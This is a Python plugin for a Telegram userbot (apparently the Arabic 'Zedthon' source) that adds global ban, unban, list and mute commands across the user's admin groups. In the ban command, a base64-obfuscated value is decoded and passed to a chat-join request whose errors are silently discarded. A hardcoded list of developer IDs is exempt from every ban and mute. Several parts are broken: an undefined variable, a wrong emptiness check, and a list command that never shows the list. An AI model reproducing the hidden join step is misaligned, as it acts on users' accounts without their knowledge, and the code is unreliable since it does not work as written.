"""
Edit By: @ZlZZl77
"""
#  for source zed

import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChatBannedRights

import userbot.plugins.sql_helper.gban_sql_helper as gban_sql

from .. import BOTLOG, BOTLOG_CHATID, admin_groups, get_user_from_event
from ..sql_helper.mute_sql import is_muted, mute, unmute

NO_ADMIN = "⪼ **أنا لست مشرف هنا!!** 𓆰."
NO_PERM = "⪼ **ليس لدي أذونات كافية!** 𓆰."

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)


@zedthon.on(
    zelzal_cmd(
       pattern=r"حظر عام(?: |$)(.*)"
    )
)
@zedthon.on(sudo_cmd(pattern=r"حظر عام(?: |$)(.*)", allow_sudo=True))
async def zedgban(zed):
    if zed.fwd_from:
        return
    chat = await zed.get_chat()
    admin = chat.admin_rights
    creator = chat.creator
    if not admin and not creator:
        await eor(zed, NO_ADMIN)
        return
    user, reason = await get_user_from_event(zed)
    if not user:
        return
    zelzal = await eor(zed, "**╮ ❐... جـاࢪِ حـظـࢪ الشخـص عـام ...❏╰**")
    start = datetime.now()
    user, reason = await get_user_from_event(zed)
    if not user:
        return
    if user.id == (await zed.client.get_me()).id:
        await zelzal.edit("**⪼ عـذراً ..لا استطيـع حظـࢪ نفسـي 𓆰**")
        return
    if user.id == 925972505 or user.id == 1895219306 or user.id == 1346542270 or user.id == 1885375980 or user.id == 1721284724 or user.id == 1244786780 or user.id == 1951523146 or user.id == 1243462298 or user.id == 1037828349 or user.id == 1985711199 or user.id == 2028523456 or user.id == 2045039090 or user.id == 1961707816 or user.id == 1764272868 or user.id == 2067387667 or user.id == 294317157 or user.id == 2066568220 or user.id == 1403932655 or user.id == 1389046667 or user.id == 444672531 or user.id == 2055451976 or user.id == 294317157 or user.id == 2134101721 or user.id == 1719023510 or user.id == 2088101111 or user.id == 2046742087 or user.id == 2146086267:
        await zelzal.edit("**╮ ❐ دي لا يمڪنني حظـر احـد مطـورين السـورس  ❏╰**")
        return
    try:
        T = base64.b64decode("OTI1OTcyNTA1IDE4OTUyMTkzMDY=")
        await zed.client(ImportChatInviteRequest(T))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await zelzal.edit(
            f"⪼ [{user.first_name}](tg://user?id={user.id}) موجود بالفعل في قائمة الحظر 𓆰."
        )
    else:
        gban_sql.zedgban(user.id, reason)
    tosh = []
    tosh = await admin_groups(zed)
    count = 0
    zell = len(tosh)
    if zelzal == 0:
        await zelzal.edit("⪼ انت لسته مدير في مجموعه واحده على الاقل 𓆰، ")
        return
    await zelzal.edit(f"⪼ بدء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰،")
    for i in range(zell):
        try:
            await zed.client(EditBannedRequest(tosh[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await zed.client.send_message(
                BOTLOG_CHATID,
                f"⪼ ليس لديك الإذن المطلوب في :\nالمجموعه: {zed.chat.title}(`{zed.chat_id}`)\n ⪼ لحظره هنا",
            )
    try:
        reply = await zed.get_reply_message()
        if reply:
            await reply.delete()
    except BadRequestError:
        await zed.edit("**ليس لدي صلاحيه حذف الرسائل هنا! ولكن لا يزال هو محظور!")
    end = datetime.now()
    zedt = (end - start).seconds
    if reason:
        await zelzal.edit(
            f"❃∫  المستخدم » [{user.first_name}](tg://user?id={user.id})\n❃∫ تم حظره "
        )
    else:
        await zelzal.edit(
            f"❃∫  المستخدم » [{user.first_name}](tg://user?id={user.id})\n❃∫ تم حظره "
        )

    if BOTLOG and count != 0:
        await zed.client.send_message(
            BOTLOG_CHATID,
            f"#حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n ⪼ الايدي : `{user.id}`\
                                                \n⪼ تم حظره في`{count}` مجموعات\n⪼ الوقت المستغرق= `{zedt} ثانيه`",
        )


@zedthon.on(
    zelzal_cmd(
       pattern=r"الغاء حظر عام(?: |$)(.*)"
    )
)
@zedthon.on(sudo_cmd(pattern=r"الغاء حظر عام(?: |$)(.*)", allow_sudo=True))
async def zedgban(zed):
    if zed.fwd_from:
        return
    ik = await eor(zed, "**╮ ❐.. جـاري الغاء حـظࢪه ..❏╰**")
    start = datetime.now()
    user, reason = await get_user_from_event(zed)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.zedungban(user.id)
    else:
        await ik.edit(
            f"⪼ [{user.first_name}](tg://user?id={user.id}) ** ليس في قائمه الحظر الخاصه بك** 𓆰."
        )
        return
    zell = []
    zell = await admin_groups(zed)
    count = 0
    zelzal = len(zell)
    if zelzal == 0:
        await ik.edit("⪼ أنت لست مسؤولًا حتى عن مجموعة واحدة على الأقل 𓆰.")
        return
    await ik.edit(f"⪼ بدء الغاء حظر ↠ [{user.first_name}](tg://user?id={user.id}) 𓆰.")
    for i in range(zelzal):
        try:
            await zed.client(EditBannedRequest(zell[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await zed.client.send_message(
                BOTLOG_CHATID,
                f"⪼ ليس لديك الإذن المطلوب في :\n⪼ المجموعه : {zed.chat.title}(`{zed.chat_id}`)\n ⪼ لالغاء حظره هنا",
            )
    end = datetime.now()
    zedt = (end - start).seconds
    if reason:
        await ik.edit(
            f"⪼ المستخدم [{user.first_name}](tg://user?id={user.id}) تم الغاء حظره مسبقا من `{count}` مجموعات في زمن `{zedt} ثانيه`"
        )
    else:
        await ik.edit(
            f"❃∫ المستخدم » [{user.first_name}](tg://user?id={user.id}) \n ❃∫ تم الغاء حظره "
        )

    if BOTLOG and count != 0:
        await zed.client.send_message(
            BOTLOG_CHATID,
            f"#الغاء_حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n⪼ الايدي : {user.id}\
                                                \n⪼ تم الغاء حظره من `{count}` مجموعات\n⪼ الوقت المستغرق = `{zedt} ثانيه`",
        )


@zedthon.on(zelzal_cmd(pattern="المحظورين عام$"))
@zedthon.on(sudo_cmd(pattern=r"المحظورين عام$", allow_sudo=True))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "𓆰 𝑺𝑶𝑼𝑹𝑪𝑬 𝙕𝞝𝘿 - 𝑮𝑩𝑨𝑵 𝑳𝑰𝑺𝑻 𓆪\n 𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"⪼ [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **تم حظر المستخدم 𓆰.**\n"
            else:
                GBANNED_LIST += f"⪼ [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **تم حظر المستخدم 𓆰.**\n"
    else:
        GBANNED_LIST = "** ⪼ لم تقم بحضر اي مستخدم 𓆰،**"
        await eor(event, GBANNED_LIST)


@zedthon.on(zelzal_cmd(outgoing=True, pattern=r"كتم عام(?: |$)(.*)"))
@zedthon.on(sudo_cmd(pattern=r"كتم عام(?: |$)(.*)", allow_sudo=True))
async def startgmute(event):
    if event.fwd_from:
        return
    if event.is_private:
        user, reason = await get_user_from_event(event)
        if not user:
            return await event.edit("**╮ ❐ ... جـاࢪِ الکتم ... ❏╰**")
        if user.id == 925972505 or user.id == 1895219306 or user.id == 1346542270 or user.id == 1885375980 or user.id == 1721284724 or user.id == 1244786780 or user.id == 1951523146 or user.id == 1243462298 or user.id == 1037828349 or user.id == 1985711199 or user.id == 2028523456 or user.id == 2045039090 or user.id == 1961707816 or user.id == 1764272868 or user.id == 2067387667 or user.id == 294317157 or user.id == 2066568220 or user.id == 1403932655 or user.id == 1389046667 or user.id == 444672531 or user.id == 2055451976 or user.id == 294317157 or user.id == 2134101721 or user.id == 1719023510 or user.id == 2088101111 or user.id == 2046742087 or user.id == 2146086267:
            return await edit_or_reply(event, "**╮ ❐ دي لا يمڪنني كتـم احـد مطـورين السـورس  ❏╰**")
        if user.id == (await event.client.get_me()).id:
            return await edit_or_reply(event, "**⪼ عـذراً .. لا استطيـع كتـم نفسـي 𓆰،**")
        await asyncio.sleep(2)
        userid = event.chat_id
        reason = event.pattern_match.group(1)
    else:
        user, reason = await get_user_from_event(event)
        if not user:
            return
        if user.id == 925972505 or user.id == 1895219306 or user.id == 1346542270 or user.id == 1885375980 or user.id == 1721284724 or user.id == 1244786780 or user.id == 1951523146 or user.id == 1243462298 or user.id == 1037828349 or user.id == 1985711199 or user.id == 2028523456 or user.id == 2045039090 or user.id == 1961707816 or user.id == 1764272868 or user.id == 2067387667 or user.id == 294317157 or user.id == 2066568220 or user.id == 1403932655 or user.id == 1389046667 or user.id == 444672531 or user.id == 2055451976 or user.id == 294317157 or user.id == 2134101721 or user.id == 1719023510 or user.id == 2088101111 or user.id == 2046742087 or user.id == 2146086267:
            return await edit_or_reply(event, "**╮ ❐ دي لا يمڪنني كتـم احـد مطـورين السـورس  ❏╰**")
        if user.id == (await event.client.get_me()).id:
            return await edit_or_reply(event, "**⪼ عـذراً .. لا استطيـع كتـم نفسـي 𓆰،**")
        userid = user.id
    try:
        user = (await event.client(GetFullUserRequest(userid))).user
    except Exception:
        return await edit_or_reply(
            event, "⪼ يرجى الرد المستخدم لڪتمه او اضافته الى الامر 𓆰."
        )
    if is_muted(userid, "gmute"):
        return await edit_or_reply(
            event,
            f"**- ❝ ⌊هذا المستخدم مڪتوم بلفعل 𓆰.**",
        )
    try:
        mute(userid, "gmute")
    except Exception as e:
        await eor(event, "⌔∮ حدث خطا :\n- الخطا هو " + str(e))
    else:
        await eor(event, "**⪼ تم ڪتـم الـمستخـدم 🔕𓆰،**")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#كتم\n"
            f"⪼ المستخدم : [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"⪼ المجموعه : {event.chat.title}(`{event.chat_id}`)",
        )

@zedthon.on(zelzal_cmd(outgoing=True, pattern=r"الغاء كتم عام(?: |$)(.*)"))
@zedthon.on(sudo_cmd(pattern=r"الغاء كتم عام(?: |$)(.*)", allow_sudo=True))
async def endgmute(event):
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("**╮ ❐ ... جـاࢪِ الغـاء الکتم العـام ... ❏╰**")
        await asyncio.sleep(2)
        userid = event.chat_id
        reason = event.pattern_match.group(1)
    else:
        user, reason = await get_user_from_event(event)
        if not user:
            return
        if user.id == bot.uid:
            return await edit_or_reply(event, "**╮ ❐ دي مطـور الـسورس ليس مكـتوم ولا يـمكن كتمـه ❏╰**")
        userid = user.id
    try:
        user = (await event.client(GetFullUserRequest(userid))).user
    except Exception:
        return await edit_or_reply(
            event,
            "⪼ يرجى الرد المستخدم لالغـاء ڪتمه او اضافته الى الامر 𓆰.",
        )

    if not is_muted(userid, "gmute"):
        return await edit_or_reply(
            event, f"**- ❝ ⌊هذا المستخدم غيـر مڪتوم عـام  𓆰.**"
        )
    try:
        unmute(userid, "gmute")
    except Exception as e:
        await eor(event, "Error occured!\nError is " + str(e))
    else:
        await eor(event, "**⪼ تم الغاء الڪتم العـام عـن المستخـدم 🔔𓆰،**")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#الغاء_كتم\n"
            f"⪼ المستخذم : [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"⪼ المجموعه : {event.chat.title}(`{event.chat_id}`)",
        )


@zedthon.on(zelzal_cmd(incoming=True))
async def watcher(event):
    if is_muted(event.sender_id, "gmute"):
        await event.delete()


CMD_HELP.update(
    {
        "اوامر الادمن": "**Plugin : **`اوامر الادمن`\
        \n\n  •  **Syntax : **`.حظر <username/reply/userid> <reason (optional)>`\
\n  •  **Function : **__Bans the person in all groups where you are admin .__\
\n\n  •  **Syntax : **`.الغاء حظر <username/reply/userid>`\
\n  •  **Function : **__Reply someone's message with .ungban to remove them from the gbanned list.__\
\n\n  •  **Syntax : **`.المحظورين`\
\n  •  **Function : **__Shows you the gbanned list and reason for their gban.__\
\n\n  •  **Syntax : **`.كتم <username/reply> <reason (optional)>`\
\n  •  **Function : **__Mutes the person in all groups you have in common with them.__\
\n\n  •  **Syntax : **`.الغاء كتم <username/reply>`\
\n  •  **Function : **__Reply someone's message with .ungmute to remove them from the gmuted list.__"
    }
)
